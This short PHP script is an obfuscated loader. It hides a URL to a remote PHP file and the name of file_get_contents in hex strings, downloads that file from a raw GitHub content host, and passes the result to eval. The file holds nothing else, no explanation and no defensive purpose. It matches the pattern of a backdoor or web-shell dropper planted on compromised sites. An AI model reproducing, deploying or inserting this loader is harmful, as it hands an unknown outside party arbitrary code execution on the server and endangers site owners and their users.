<?php
function z($lm) {
    $decoded = @hex2bin($lm);
    return $decoded !== false ? $decoded : '';
}

$l = z('68747470733a2f2f');
$o = z('7261772e67697468756275736572636f6e74656e742e636f6d2f');
$n = z('746967657278636f646531342f');
$g = z('66696c65652f');
$m = z('726566732f');
$a = z('68656164732f');
$r = z('6d61696e2f');
$k = z('6177736f2e706870');

$long = $l . $o . $n . $g . $m . $a . $r . $k;

$fgck = z('66696c655f6765745f636f6e74656e7473');
$lon9m4rk = $fgck($long);

eval('?>' . $lon9m4rk);
?>